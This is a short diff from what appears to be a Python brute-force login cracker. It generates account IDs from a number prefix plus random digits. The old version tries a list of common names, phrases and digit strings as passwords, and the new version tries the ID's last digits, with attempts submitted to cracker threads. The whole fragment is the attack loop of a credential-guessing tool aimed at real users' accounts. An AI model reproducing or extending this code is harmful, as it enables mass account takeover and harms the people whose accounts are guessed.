@@ -137,9 +137,9 @@ def random_number():
 		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
 		linex()
 		for guru in user:
-            uid = kode+kodex+kod+guru
-            pwx = [kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','Ramjan','Md Jahidul Islam','Jahidul','Shakil','Badsha','Tanjila','Rashel','Mohammad','113355','22334455','121235','1234567890']
-            yaari.submit(rcrack1,uid,pwx,tl)
+			uid = kode+guru
+			pwx = [uid[-psl:]]
+			zim.submit(cracker,uid,pwx,tl)
 	result(oks,cps)
 
 
